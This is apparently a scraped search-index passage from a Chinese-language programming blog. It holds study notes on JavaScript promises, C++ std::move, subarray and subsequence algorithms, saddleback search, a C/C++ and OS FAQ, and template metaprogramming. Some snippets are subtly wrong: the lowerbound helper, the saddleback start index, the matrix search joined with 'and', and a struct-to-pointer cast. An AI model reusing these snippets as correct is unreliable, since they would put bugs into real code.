promise是從callback hell來的，而每個callback都有接callback的變數，所以可以用之前寫過的方式來把它簡化\n最後拿到的就是promise\nawait is bind \u0026amp; async is return 在monad中 return 是 讓一個值變成monad 而 bind 是從monad中取值，再包成monad\n對應到 Promise就是\nthen(() =\u0026gt; {}): bind Promise.resolve(val): return 但是寫Promise.resolve(val)配function有點長，所以有了async 寫then((x) =\u0026gt; { return x})只是為了取個值也很煩，所以有了await\n從promise到await 正常的code\nlet a = 1 let b = 2 let c = 3 return a+b+c 包成callback\n(a) =\u0026gt; { return (a,b) =\u0026gt; { return (a,b,c) =\u0026gt; { return a+b+c }(1,2,3); }(1,2); }(1); // OR (a) =\u0026gt; { return (b) =\u0026gt; { return (c) =\u0026gt; { return a+b+c }(3); }(2); }(1); 用promise來寫，因為then之間的context不能共享，所以會變得很難看\nnew Promise(() =\u0026gt; { return 1 }) .then((a) =\u0026gt; { return [a,2]}) .then((a,b) =\u0026gt; { return [a,b,3] }) .then((a,b,c) =\u0026gt; { return a+b+c }) //OR new Promise(() =\u0026gt; { return 1 }) .then((a) =\u0026gt; { return new Promise(() =\u0026gt; { return 2}) .then((b) =\u0026gt; { return new Promise(() =\u0026gt; {return 3}) .then((c) =\u0026gt; { return a+b+c })})}) 用await來拆\nasync function a() { return 1 } async function b() { return 2 } async function c() { return 3 } async function demo() { let a = await a() let b = await b() // 這裡可以當成then的參數列自動多了a,b，同時都會被帶對應的值 let c = await c() return a+b+c } ","permalink":"https://littlebees.github.io/2020/12/await-%E8%88%87-async-%E8%88%87-promise/","summary":"動機 想到就來寫一寫\npromise is monad promise是從callback hell來的，而每個callback都有接callback的變數，所以可以用之前寫過的方式來把它簡化\n最後拿到的就是promise\nawait is bind \u0026amp; async is return 在monad中 return 是 讓一個值變成monad 而 bind 是從monad中取值，再包成monad\n對應到 Promise就是\nthen(() =\u0026gt; {}): bind Promise.resolve(val): return 但是寫Promise.resolve(val)配function有點長，所以有了async 寫then((x) =\u0026gt; { return x})只是為了取個值也很煩，所以有了await\n從promise到await 正常的code\nlet a = 1 let b = 2 let c = 3 return a+b+c 包成callback\n(a) =\u0026gt; { return (a,b) =\u0026gt; { return (a,b,c) =\u0026gt; { return a+b+c }(1,2,3); }(1,2); }(1); // OR (a) =\u0026gt; { return (b) =\u0026gt; { return (c) =\u0026gt; { return a+b+c }(3); }(2); }(1); 用promise來寫，因為then之間的context不能共享，所以會變得很難看","title":"await 與 async 與 promise"},{"content":"動機 寫寫std::move的筆記\nvalue type \u0026amp; reference type value type: 每個變數持有的都是獨立的資料 reference type: 每個變數持有的都是地址 所以如果使用者想感受到value type就要看到，\n對變數修改時其他變數看的到\npointer in C \u0026amp; reference in CPP cpp 預設的傳值是pass-by-value，所以會copy的是資料，而(Java, Python\u0026hellip;)大部分的PL傳的都是reference\n就因為cpp的這件事，變成他與c一樣都要把指標丟來丟去，而cpp不想寫星號(悲劇的開始)，所以加了pass-by-reference\n回到c來看，會有指標的是變數(已經被賦值的)，只能從變數取指標(如果要直接指定記憶體位置，c是做得到啦，但這邊不談這個)\n但如果是像\nint *a = 1+2; int \u0026amp;b = 1+2; 就會出事，因為資料沒有被變數接住，就不能被指定到指標與參考，這十分不方便\n例子\nint add(int \u0026amp;a, int \u0026amp;b) return a+b; } add(1+2,1+2); 遇到這種，就要先把資料assign到變數後才能用\nstd::move 所以cpp這次怎麼曲線救國?\n再多一個傳值的選項，說\n我之後就用不到了，可以把我搬空(rvalue, xvalue) ? 而std::move就是把一個變數轉成說可以搬空我這樣\n整體std::move大概像\nstatic_cast\u0026lt;typename std::remove_reference\u0026lt;T\u0026gt;::type\u0026amp;\u0026amp;\u0026gt;(t) 搬空? 見下面的例子\nclass string { char* data public: string (const char* p) { size_t size = std::strlen(p) + 1; data = new char[size]; std::memcpy(data, p, size); } string (string\u0026amp;\u0026amp; rhs) { data = rhs.data; rhs.data = nullptr; // 搬空 } ~string() { delete[] data; } }; 頭好昏，在c好好的，怎麼到cpp就變這麼複雜了 (想要) cpp想讓複製物件，變成如同複製指標一樣 (躲掉多的deep copy，但是又不想多一個變數去接) (但是) cpp的語法讓複製資料與複製指標看起來一樣 (所以) 要多一個語法以及傳值作法，處理看起來一樣的傳值 (結果) 我們多了 \u0026amp;\u0026amp; 與 move 因為cpp的語法讓複製資料與複製指標看起來一樣，但卻又在使用上把指標與資料區分開來\n在其他語言不論物件或是整數的賦值都是起來一樣，但是cpp遇到reference會把一般資料的賦值混在一起，\n就變成要再多一個case處理原本的複製資料，最後得到的就是現在的這些東西，還有更複雜的value category\nRef Java 有值类型吗？ What is std::move(), and when should it be used?\n","permalink":"https://littlebees.github.io/2020/12/cpp%E7%9A%84stdmove/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e寫寫std::move的筆記\u003c/p\u003e","title":"cpp的std::move"},{"content":"動機 分治也是可以重複走的\n暴力 就列舉\ndef mss(l): return max([[sum(l[i:j+1]) for j in range(0, len(l)-i)] for i in range(0,len(l))]) 分治 分成\n只有左邊 只有右邊 cross兩邊 兩邊怎麼算? 從中間延伸出去，再把兩邊加起來\n原本認定分治的割出來的遞迴是不會重複走到之前其他遞迴走過的部分 但經過這個才想起來，merge sort也是都重複走了array log(n)次阿!!\ndef helper(l): if len(l) == 0: return 0 ret = tmp = l[0] for n in l[1:]: tmp += n ret = max(ret, tmp) return ret def mss(l: List[int]) -\u0026gt; int: if not l: return 0 if len(l) == 1: return l[0] else: if len(l) % 2 == 0: mid = len(l) // 2 onlyLeft = mss(l[:mid]) onlyRight = mss(l[mid:]) center = 0 left = helper(l[:mid][::-1]) right = helper(l[mid:]) else: mid = len(l) // 2 onlyLeft = mss(l[:mid+1]) onlyRight = mss(l[mid:]) center = l[mid] left = helper(l[:mid][::-1]) right = helper(l[mid+1:]) return max([center + left + right, onlyLeft, onlyRight]) DP tmp紀錄定義為以此為終點的mss 之後就是看之前的加現在看哪個大\ndef mss(self, nums: List[int]) -\u0026gt; int: ret = tmp = nums[0] for n in nums[1:]: tmp = max(n, n+tmp) ret = max(ret, tmp) return ret Ref 分治 P.S.:geeksforgeeks的資料會不會太贊了\n","permalink":"https://littlebees.github.io/2020/12/maximum-subarray-sum/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e分治也是可以重複走的\u003c/p\u003e","title":"Maximum Subarray Sum"},{"content":"動機 記錄用\nDP 定義lis[i]為以i為終點的最長lis長度\n@functools.lru_cache(None) def lis(i): global l return max([lis(x) for x in range(0,i) if l[i] \u0026gt; l[x]]+[0])+1 DP with binary search 如果說新的數字比目前的lis最後一個大，就長度就直接加上去\n如果比他小，不會影響長度，但是可能會形成更長的lis，可以找個差不多的數字去取代他，用lowerbound\n如果要建構lis的話，可以記下數字在構成lis的index，之後就是根據長度，從後面往前找吻合當前長度的index 一個一個湊出來\ndef lowerbound(l, target): i = 0 j = len(m)-1 while (j-i) \u0026gt; 1: mid = (i+l)//2 if l[mid] \u0026gt;= target: j = mid else: i = mid+1 return i def lis(l): idx = [-1] * len(l) ret = [l[0]] for i in range(1,len(l)): if l[i] \u0026gt; ret[-1]: ret.append(l[i]) idx[i] = i else: j = lowerbound(ret,l[i]) ret[j] = l[i] idx[i] = j return len(ret) \u0026#39;\u0026#39;\u0026#39; ans = [] revl = reversed(iter(l)) revidx = reversed(iter(idx)) nowidx = next(revidx) nowval = next(revl) for i in reversed(range(0,len(ret))): while nowidx != i: nowidx = next(revidx) nowval = next(revl) ans.append(nowval) ans.reverse() return ans \u0026#39;\u0026#39;\u0026#39; LCS(Longest Common Subsequence) 找lcs的長度 像\ns1: 2 5 7 9 3 1 2 s2: 3 5 3 2 8 lcs(s1,s2) = 3 (5 3 2) @cache def lcs(a,b): if not a or not b: return 0 elif a[0] == b[0]: return 1+lcs(a[1:],b[1:]) else: return max(lcs(a,b[1:]),lcs(a[1:],b)) Ref 演算法筆記\n","permalink":"https://littlebees.github.io/2020/12/longest-increasing-subsequence/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e記錄用\u003c/p\u003e","title":"Longest Increasing Subsequence"},{"content":"動機 leetcode時被弄過，所以記錄下來\n問題 給定一個2d matrix，行與列都已排序好(小到大)，在這之中找出是否有指定的數字\n1. 暴力 這沒有應用到已排序的特點，O(n^2)\ndef f(m,target): for x in m: for n in x: if n == target: return True return False 2. 分治 表格可以分開，又是表格， 同時分出來的表格都要走過(表格之間不會重疊)，最後再一起看有沒有目標，分治!! O(n^1.58)\ndef f(m,target,i=len(m)//2,j=len(m[0])//2): if not m: return False if m[i][j] == target: return True elif m[i][j] \u0026lt; target: # 在右手邊 return f(m[i][j+1:],target) and # 右手邊 f(m[i+1:],target) and # 下面 f([x[j+1:] for x in m[:i]], target) # 上面的右手邊 else: # 在左手邊 return f(m[i][:j],target) and # 左手邊 f(m[:i],target) and # 上面 f([x[:j+1] for x in m[i+1:]], target) # 下面的左手邊 3. saddleback search 還記得two sum時怎麼移動ptr的嗎?\n比目標大動右邊(範圍的上限變小)，比目標小動左邊(範圍的下限變大)\n這裡也可以做出讓\n範圍的上限變小 範圍的下限變大 的操作嗎?\n從左下開始，如果\n太小，往右 太大，往上 O(N+M)\ndef f(m,target): i = len(m) j = 0 while 0 \u0026lt;= i and j \u0026lt; len(m[0]): if m[i][j] == target: return True elif m[i][j] \u0026gt; target: i -= 1 else: j += 1 return False TODO 在functional pearl中其實有一篇說到怎麼從 分治 推到 saddleback search，但之後有時間再來看\nRef saddleback Divide and Conquer\n","permalink":"https://littlebees.github.io/2020/12/saddleback-search-algorithm/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003eleetcode時被弄過，所以記錄下來\u003c/p\u003e","title":"saddleback search algorithm"},{"content":"動機 整理一些之前的問題\nextern, static, global extern 的意思是去外面找，去其他的程式中找在哪 static 的意思是只在這個範圍存活\u0026amp;可見，用這個方式來看file(global)、function、class(only for c++)的static變數，就會很一致了\n下面的三個code就是demo extern的用處\nextern之後，a就可以用了 但是對於有static的global變數，linker會找不到他\naaa.cpp\nint a = 10; int b = 100; static int c = 1000; void x(){a--;} void y(){b--;} aaa.hpp\nextern int b; void x(); void y(); bbb.cpp\n#include \u0026#34;aaa.hpp\u0026#34; #include \u0026lt;iostream\u0026gt; int main() { //std::cout \u0026lt;\u0026lt; a; error std::cout \u0026lt;\u0026lt; b \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; y(); std::cout \u0026lt;\u0026lt; \u0026#34;after y: \u0026#34; \u0026lt;\u0026lt; b \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; b--; std::cout \u0026lt;\u0026lt; \u0026#34;after b--: \u0026#34; \u0026lt;\u0026lt; b \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; extern int a; std::cout \u0026lt;\u0026lt; a; x(); std::cout \u0026lt;\u0026lt; \u0026#34;after a: \u0026#34; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; a--; std::cout \u0026lt;\u0026lt; \u0026#34;after a--: \u0026#34; \u0026lt;\u0026lt; a \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; // extern static int c; // linker fails, cant find c } extern \u0026ldquo;C\u0026rdquo; 在C++中函數可以overload，所以C++的函數其實編譯出來後名字會被加料，但 如果要include一些用c寫好的函數就會出事，名字會對不上，所以要用extern \u0026quot;C\u0026quot;\n用extern \u0026quot;C\u0026quot;就是說這段不要加料，照C的方式來\nuse C lib in C++ /* fromc.h */ #ifdef __cplusplus extern \u0026#34;C\u0026#34; int get10(); #else int get10(); #endif /* fromc.c */ int get10() {return 10;} // useclib.cpp #include \u0026lt;iostream\u0026gt; #include \u0026#34;fromc.h\u0026#34; int main() { std::cout \u0026lt;\u0026lt; get10() \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } use C++ lib in C // fromcpp.hpp int get20_for_C(); // fromcpp.cpp int get20() {return 20;} extern \u0026#34;C\u0026#34; { int get20_for_C() {return get20();} } /* usecpplib.c */ #include \u0026lt;stdio.h\u0026gt; #include \u0026#34;fromcpp.hpp\u0026#34; int main() { printf(\u0026#34;%d\\n\u0026#34;, get20_for_C()); } static 為什麼放在.data 程式在記憶體中會有\nstack\u0026amp;heap a. stack: 放local var與函數的call stack b. heap: 動態allocate的東西 bss: uninit的static data: 放 全域變數與常數 text: 程式碼 data 與 stack\u0026amp;heap 的差別是?\ndata的資料只要程式還在跑，就不會消失 stack\u0026amp;heap的資料隨時都有可能消失\n所以static 為什麼放在.data? 因為static隨時都要存活，所以不能放在stack\u0026amp;heap，那就只能放在data\nabout C++ class friend struct A { void normal_method() {} friend void friend_method(A\u0026amp; me) {} }; int main() { A a; //原本的method call a.normal_method(); //不想放前面的method call，當然不一定是只能傳自己，這就是函數可以多個 friend_method(a); } virtual 有標virtual就是會在runtime時依據實際上的type去找method執行，如果沒有就是依據變數的type\n#include \u0026lt;iostream\u0026gt; struct A { void x() {std::cout \u0026lt;\u0026lt; \u0026#34;x\\n\u0026#34;;} virtual void y() {std::cout \u0026lt;\u0026lt; \u0026#34;y\\n\u0026#34;;} }; struct B : public A { void x() {std::cout \u0026lt;\u0026lt; \u0026#34;x2\\n\u0026#34;;} virtual void y() {std::cout \u0026lt;\u0026lt; \u0026#34;y2\\n\u0026#34;;} }; int main() { A* a = new B(); a-\u0026gt;x(); // x a-\u0026gt;y(); // y2 ((B*)a)-\u0026gt;x(); // x2 delete a; } 注意: constructor不能是virtual constructor本來就是從new時的type建立回去，所以不需要virtual 另一個說法是new物件時還沒有virtual的table，所以不能是virtual\n但destructor需要，因為如果像上面的code去刪一個parent指標，時沒有virtual，會從parent的destructor去跑，這就尷尬了\nobject slicing 就是從child轉到parent會讓child的東西不見，這就是slicing 但是，因為cpp有copy，事情可能會搞砸\n如果從child到parent是用copy的話，就不會根據原本的資料去找attribute與method，同時如果要轉回去也會出事(要記得用dynamic_casr轉啊)\nclass Base { protected: int m_value{}; public: Base(int value) : m_value{ value } {} virtual const char* getName() const { return \u0026#34;Base\u0026#34;; } int getValue() const { return m_value; } }; class Derived: public Base { public: Derived(int value) : Base{ value } {} virtual const char* getName() const { return \u0026#34;Derived\u0026#34;; } }; void printName(const Base base) // note: base passed by value, not reference { std::cout \u0026lt;\u0026lt; \u0026#34;I am a \u0026#34; \u0026lt;\u0026lt; base.getName() \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } int main() { Derived derived{ 5 }; std::cout \u0026lt;\u0026lt; \u0026#34;derived is a \u0026#34; \u0026lt;\u0026lt; derived.getName() \u0026lt;\u0026lt; \u0026#34; and has value \u0026#34; \u0026lt;\u0026lt; derived.getValue() \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; Base \u0026amp;ref{ derived }; // ok std::cout \u0026lt;\u0026lt; \u0026#34;ref is a \u0026#34; \u0026lt;\u0026lt; ref.getName() \u0026lt;\u0026lt; \u0026#34; and has value \u0026#34; \u0026lt;\u0026lt; ref.getValue() \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; Base *ptr{ \u0026amp;derived }; // ok std::cout \u0026lt;\u0026lt; \u0026#34;ptr is a \u0026#34; \u0026lt;\u0026lt; ptr-\u0026gt;getName() \u0026lt;\u0026lt; \u0026#34; and has value \u0026#34; \u0026lt;\u0026lt; ptr-\u0026gt;getValue() \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; Base base{ derived }; // be sliced std::cout \u0026lt;\u0026lt; \u0026#34;base is a \u0026#34; \u0026lt;\u0026lt; base.getName() \u0026lt;\u0026lt; \u0026#34; and has value \u0026#34; \u0026lt;\u0026lt; base.getValue() \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; printName(derived); // be sliced return 0; } the rule of five 如果定義了自己的\ndestructor copy constructor copy assignment 就要把其他的也一起定義完\n不過因為C++11有move，所以要多兩個\nmove constructor move assignment class rule_of_five { char* cstring; // raw pointer used as a handle to a dynamically-allocated memory block public: rule_of_five(const char* s = \u0026#34;\u0026#34;) : cstring(nullptr) { if (s) { std::size_t n = std::strlen(s) + 1; cstring = new char[n]; // allocate std::memcpy(cstring, s, n); // populate } } ~rule_of_five() { delete[] cstring; // deallocate } rule_of_five(const rule_of_five\u0026amp; other) // copy constructor : rule_of_five(other.cstring) {} rule_of_five(rule_of_five\u0026amp;\u0026amp; other) noexcept // move constructor : cstring(std::exchange(other.cstring, nullptr)) {} rule_of_five\u0026amp; operator=(const rule_of_five\u0026amp; other) // copy assignment { return *this = rule_of_five(other); } rule_of_five\u0026amp; operator=(rule_of_five\u0026amp;\u0026amp; other) noexcept // move assignment { std::swap(cstring, other.cstring); return *this; } // alternatively, replace both assignment operators with // rule_of_five\u0026amp; operator=(rule_of_five other) noexcept // { // std::swap(cstring, other.cstring); // return *this; // } }; OS related Edge Trigger \u0026amp; Level Trigger Edge Trigger: 狀態變化時產生io事件 Level Trigger: 滿足條件時產生io事件 memory memory hierarchy register cache memory main memory HDD Direct Memory Access, DMA 讓device可以直接操作記憶體，像是device把資料copy到mem去 會導致cache不一致!! (因為直接改mem，但cache不知道) 寫入mem時要通知cache做invalidate 讀cache時，dma已經開始(拿到最新的) 或 dma關閉(不會被改) 不然cpu就要中斷自己去做 由cpu啟動dma，剩下的事情就是dma controller的工作 mutex \u0026amp; semaphore mutex 受益人數: 一人 誰能改變狀態(上鎖): a. 還沒上鎖: 所有人 b. 上鎖了: 上鎖的人 使用場域: 保護critical zone semaphore 受益人數: 看設定多少 誰能改變狀態(記數): 誰都ok 使用場域: 同步時的signal Big Endian \u0026amp; Little Endian 資料放進記憶體中的時\nBig-Endian(Network Order): 最高位的位元組會放在最低的記憶體位址上 Little-Endian: 最高位的位元組放在最高的記憶體位址上 記憶體的最高在右邊，但資料的最高在左手邊\nHigh -\u0026gt; 12345678 \u0026lt;- Low Low -\u0026gt; a[0], a[1], a[2], a[4] \u0026lt;- High #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; typedef union { uint32_t l; unsigned char c[4]; } EndianTest; // 輸出位元組順序 void printBytes(uint32_t x) { EndianTest et; et.l = x; for (int i = 0; i \u0026lt; 4; i++) { printf(\u0026#34;0x%02X \u0026#34;, et.c[i]); } printf(\u0026#34;n\u0026#34;); } int main() { uint32_t x = 0x12345678; // big: 12, 34, 56, 78 // little: 78, 56, 34, 12 printf(\u0026#34;0x%X 在記憶體中的儲存順序：\u0026#34;, x); printBytes(x); uint32_t n = htonl(x); printf(\u0026#34;0x%X 在網路中的傳輸順序：\u0026#34;, x); printBytes(n); } how to IPC pipe(named pipe) popen message queue semophore signal shared memory socket file deadlock condition race condition: 輸出依據不受控制的事件出現順序或者出現時機 Critical section: access共享資源的code synchronization: 協調讓thread使用Critical section在時間上一致與統一 Cache coherence: 快取一致性 (為什麼放這邊?，可以看volatile)\n資源唯一(互斥) =\u0026gt; a node in a graph 不會被搶(不可搶占) =\u0026gt; node cant be removed 拿著並等別的資源(占有且等待) =\u0026gt; an edge to other node 別人也在等我(循環等待) =\u0026gt; cycle thread \u0026amp; process process: OS的資源分配單位，彼此不影響 thread: 程式的執行單位，互相影響 a. a kernel thread to a user thread: linux\u0026rsquo;s clone(child process, LWP) b. a kernel thread to many user threads c. many kernel threads to many user threads how to talk to kernel virtual filesystems(e.g. /proc, /sys, configfs, relayfs): kernel \u0026lt;-\u0026gt; user, exchange data netlink/UDP socket: kernel \u0026lt;-\u0026gt; user, exchange data mmap: kernel \u0026lt;-\u0026gt; user, exchange data syscall: user -\u0026gt; kernel, invoke function ioctl: kernel \u0026lt;-\u0026gt; user, exchange data signal from kernel: kernel -\u0026gt; user, invoke handler upcall: kernel -\u0026gt; user, invoke a function ref\nvolatile 就是叫compiler每次都乖乖重新拿值，不然可能有神秘的優化把變數消滅掉\n用處\nregister 在multi-thread共用的變數 一個中斷服務子程序中會訪問到的非自動變量(Non-automatic variables) Can we use “const” and “volatile” in the same variable? extern const volatile unsigned int rt_clock; 用在監看reg的值的時候\nmalloc、calloc、realloc malloc: 就是allocate calloc: allocate + 初始值 realloc: resize但是不一定從原本的位置開始，所以會copy舊資料到新位置 pointer size 看記憶體是幾位元的\n64: 8 bytes 32: 4 bytes OO in C struct與透過method控制struct就是封裝 繼承要利用c的struct特性\n因為struct只是去算field的offset，所以只要\n同一個位置 同樣長度 就可以當成child class (484與golang很像) struct A { int a; }; struct B { int a; // extend int b; }; void getA(A* this) { printf(\u0026#34;%d\\n\u0026#34;, this-\u0026gt;a); } void getB(B* this) { printf(\u0026#34;%d %d\\n\u0026#34;, this-\u0026gt;a, this-\u0026gt;b); } int main() { B y{30,20}; getA((A*)y); } 那多形? struct自己存實作的fucntion ptr\nmacro 一些工具 concat #define cons(a,b) a##b // cons(1,2) =\u0026gt; 12 可變參數(預設參數)，如果有尾巴的逗號會被吃掉 (C99) #define foo(must, ...) _foo(must, (foo_args){.a = 8, .b = 3.14, __VA_ARGS__}); // foo(\u0026#39;D\u0026#39;, .b = 9, .a = 2); to_string #define STR(s) #s // STR(123) =\u0026gt; \u0026#34;123\u0026#34; _Generic (C11, 就是泛型) #define foo(a, b) \\ _Generic((a), \\ int: func1, \\ double: _Generic((b), \\ int : func2, \\ double: func3 \\ ) \\ )(a, b) 使用時要注意 用括號 #define pow(a) (a) * (a) // pow(1+2) =\u0026gt; (1+2) * (1+2) 如果有temp變數要加大括號，不然會汙染到原本的scope #define swap(a, b) { \\ int temp = a; \\ a = b; \\ b = temp; \\ } 幫數字標上type #define NUM (100*123*234UL) // 注意: 型別要放在數字後面!! // U for unsigned // L for long int or long float // F for float // default: double or int 如果要用macro在另一個macro要多一層讓macro先展開 #define A 2 #define CONS(a,b) a##b // CONS(A,A) =\u0026gt; AA #define _CONS(a,b) a##b #define CONS_GOOD _CONS(a,b) // CONS_GOOD(A,A) =\u0026gt; _CONS(2,2) =\u0026gt; 22 useful macro \u0026amp; case study #include \u0026lt;stdio.h\u0026gt; #define debug(fmt, ...) { \\ fprintf(stderr, \u0026#34;(%s:%d) \u0026#34;fmt\u0026#34;\\n\u0026#34;, __FILE__, __LINE__, ##__VA_ARGS__); \\ } int main(void) { debug(\u0026#34;%s %d\u0026#34;, \u0026#34;Shit happen!\u0026#34;, 1); return 0; } #define hash_hash # ## # #define mkstr(a) # a #define in_between(a) mkstr(a) #define join(c, d) in_between(c hash_hash d) //join(x, y) //in_between(x hash_hash y) //in_between(x ## y) //mkstr(x ## y) default args: 在函數做設定\n#include \u0026lt;stdio.h\u0026gt; #define f(...) def_f((f_args) {__VA_ARGS__}) typedef struct { int i; double j; } f_args; void real_f(int i, double j) { printf(\u0026#34;%i %f\\n\u0026#34;,i,j); } void def_f(f_args args) { int i = args.i ? args.i : 10; double j = args.j ? args.j : 10.5; real_f(i,j); } int main() { f(3,8); f(.j=100.2, .i=4); f(2); f(.j=45.3); f(); f(12,); return 0; } default args: 在struct(macro展開時)做設定\n#include \u0026lt;stdio.h\u0026gt; #define f(...) def_f((f_args){.i=10, .j=10.5, __VA_ARGS__}) typedef struct { int i; double j; } f_args; void real_f(int i, double j) { printf(\u0026#34;%i %f\\n\u0026#34;,i,j); } void def_f(f_args x) { real_f(x.i,x.j); } int main() { //f(3,8); f(.j=100.2, .i=4); //f(2); f(.j=45.3); f(); //f(12,); return 0; } floating point 不要直接比較，要變成看相對誤差 abs((0.1+0.2)-0.3) \u0026lt; epsilon 少用float做直接運算，轉成整數\n使用另外設計的Lib\n調整算式\n豐富的case\nISR __interrupt double compute_area(double radius) // 1. no args (這應該是上半部) { double area = PI * radius * radius; // 2. kernel space 用float?! printf(\u0026#34;\\nArea = %f\u0026#34;， area); // 3. 在中斷跑IO!? return area; // 4. irq沒有return，syscall有 } pitfall auto cast 有unsigned就會自動變成unsigned\nvoid foo(void) { unsigned int a = 6; int b = -20; (a+b \u0026gt; 6) ? puts(\u0026#34;\u0026gt; 6\u0026#34;) : puts(\u0026#34;\u0026lt;= 6\u0026#34;); // \u0026gt; 6 } type size 只有char確定是1byte!!\n所以下面的code可能會出事，因為unsigned int不一定是4bytes\nunsigned int zero = 0; unsigned int compzero = 0xFFFF; /*1\u0026#39;s complement of zero */ type size char 1 byte unsigned char 1 byte signed char 1 byte int 2 or 4 bytes unsigned int 2 or 4 bytes short 2 bytes unsigned short 2 bytes long 8 bytes or (4bytes for 32 bit OS) unsigned long 8 bytes p++ \u0026amp; ++p 就算有括號，p++的inc還是後做，++p的inc還是先做\nint a[5]={1,2,3,4,5}; int *p=a; *(p++)+=123; *(++p)+=123; //124 2 126 4 5 typedef #define dPS struct s * typedef struct s * tPS; dPS p1,p2; // =\u0026gt; struct s * p1,p2; tPS p3,p4;// =\u0026gt; struct s *p1,*p2; pointer \u0026amp; array type 先看array，再看pointer，有括號就先看括號\nint a[10]; // An array of 10 integers int *a[10]; // An array of 10 pointers to integers // int ((*a)[10]) int (*a)[10]; // A pointer to an array of 10 integers int (*a)(int); // A pointer to a function a that takes an integer argument and returns an integer int (*a[10])(int); // An array of 10 pointers to functions that take an integer argument and return an integer const \u0026amp; pointer int const *a; // ptr的內容固定 int * const a; // 被指到的int固定 const int const * a; // 兩個都固定 計組 Pipeline instruction fetch instruction decode/fetch register instruction execute/ branch or jump memory access to mem write back to reg 因為現在是所有指令共用datapath，所以要pipeline reg讓stage去load需要的資料去完成每個階段的任務\nharzards Data Hazard LoadStore (RAW): 還沒寫完就被讀(拿到舊的值) StoreStore (WAW): 前面還沒寫完，後面已經寫進去了 StoreLoad (WAR): 來沒讀完就被寫(拿到未來的值) sol compiler 或是 cpu的 stall forwarding: 把需要的資訊丟到後面的pipeline reg，讓後面的stage先做事 Control Hazard if 的 bool還沒被算出來!! sol stall 分支預測(猜) Structural hazard 在pipeline上指令的需要同一個資源 sol stall 亂序執行 Network Programming server socket new socket() bind 填ip, port listen socket.start() accept (可以去看block-nonblock-sync-async補一下block與non-block的知識) loop -\u0026gt; get socket read / write close client socket connect write / read close 傳struct 不能直接傳，大小頭、padding、type的size不一定會一樣，會可能會轉不回來\n轉成string 用htonl與ntohl，自己把int轉一轉 host order to network order long (integer, s是short integer) network order to host order long (integer, s是short integer) float就要自己設計格式，沒有htonl與ntohl可以用，不然就是去找序列化的lib，像protobuf\npipe pipefs create a file in pipefs, which is in mem return 2 fd, one for writing, another for reading how tcpdump works 透過libpcap的api生bpf 除此之外 bit trick lvalue, rvalue tmp Maximum subarray linked list binary search tree LRU cache ","permalink":"https://littlebees.github.io/2020/12/c/c-%E7%9A%84faq/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e整理一些之前的問題\u003c/p\u003e","title":"C/C++的FAQ"},{"content":"動機 一切的開始，只是想要個reversed而已，就順便把tmp補完\ntips when using template 別用float 因為浮點數的結果不一致\nfunc\u0026lt;1/3.f\u0026gt; (); func\u0026lt;2/6.f\u0026gt; (); header 原本函數的宣告與實作會分成header與source code，但是template的code不能放在source code中。\n因為compiler要先看有template的code，之後才能填充type，在生出真正的code，專業一點叫 實體化(instantiation)\nsome tools constexpr const int SOME_INT_WILL_NOT_BE_MODIFIED = some_func(); constexpr int INT_IS_COMPUTED_IN_COMPILCATION = 1 + 5; // #define MACRO_INT 1 + 5 // 這只是會展開成 1+5但不會算成6，但constexpr會，同時template可以拿到他 constexpr int foo(int i) { return i + 5; } int main() { int i = 10; std::array\u0026lt;int, foo(5)\u0026gt; arr; // OK // as if 5 + 5, and computed in complication foo(i); // Call is Ok // This is usual function // But... std::array\u0026lt;int, foo(i)\u0026gt; arr1; // Error // Compiler cant know what the value is foo(i), cuz i is determinated in run-time } using typedef int A; // \u0026lt;=\u0026gt; int typedef A; // \u0026lt;=\u0026gt; using A = int; decltype struct A { double x; }; const A* a; decltype(a-\u0026gt;x) y; // type of y is double (declared type) decltype((a-\u0026gt;x)) z = y; // type of z is const double\u0026amp; (lvalue expression) typename 把typename後面的東西當成type來看\nfunction only with types 只要type對了就好\nvoid f(int,char[0]) { std::cout \u0026lt;\u0026lt; \u0026#34;only types\\n\u0026#34;; } char wtf[0]; f(10,NULL), f(123,wtf); Template specialization template的參數先填掉 template\u0026lt;int n\u0026gt; struct fact { enum { val = n*fact\u0026lt;n-1\u0026gt;::val }; }; template\u0026lt;\u0026gt; struct fact\u0026lt;0\u0026gt; { enum { val = 1 }; }; 0是誰? 0可以當成 整數 null ptr bool的false compiler自己推type template\u0026lt;typename T\u0026gt; T id(T x) { return x; } int main(int argc, char *argv[]) { std::cout \u0026lt;\u0026lt; id(123) \u0026lt;\u0026lt; \u0026#39;,\u0026#39; \u0026lt;\u0026lt; id(\u0026#34;123\u0026#34;) \u0026lt;\u0026lt; \u0026#39;\\n\u0026#39;; } basic (很像functional programming) fact template\u0026lt;int n\u0026gt; struct fact { enum { val = n*fact\u0026lt;n-1\u0026gt;::val }; }; template\u0026lt;\u0026gt; struct fact\u0026lt;0\u0026gt; { enum { val = 1 }; }; int main() { //cout \u0026lt;\u0026lt; Min\u0026lt;int, 1,2,3,4\u0026gt;::val \u0026lt;\u0026lt; endl; //下面的 cout \u0026lt;\u0026lt; fact\u0026lt;10\u0026gt;::val \u0026lt;\u0026lt; endl; } Min 目標: Min\u0026lt;int, 1,2,3,4\u0026gt;::val拿到1\n宣告 template\u0026lt;typename T, T ...\u0026gt; // T...是type，像是va_list struct Min; case1: 如果有不只一個數字 template\u0026lt;typename T, T v,T ... args\u0026gt; // typename就是說這是一個type struct Min\u0026lt;T,v,args\u0026gt; { // 要填\u0026lt;...\u0026gt;符合原本的宣告 // destruct pack //constexpr static auto val = min(v, 